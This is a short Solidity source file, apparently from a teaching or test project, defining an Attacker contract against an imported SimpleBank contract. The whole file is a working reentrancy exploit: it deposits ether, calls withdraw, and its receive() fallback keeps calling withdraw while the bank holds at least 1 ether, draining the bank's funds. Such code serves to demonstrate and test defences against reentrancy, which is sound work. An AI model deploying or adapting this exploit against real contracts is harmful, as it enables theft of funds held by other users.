// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.24;    

import {SimpleBank} from "../src/SimpleBank.sol";

contract Attacker {
    SimpleBank simpleBank;

    constructor(address _simpleBankAddress) {
        simpleBank = SimpleBank(_simpleBankAddress);
    }

    function attack() external payable {
        simpleBank.deposit{value: msg.value}();
        simpleBank.withdraw();
    }

    receive() external payable {
        if(address(simpleBank).balance >= 1 ether) {
            simpleBank.withdraw();
        }
    }

}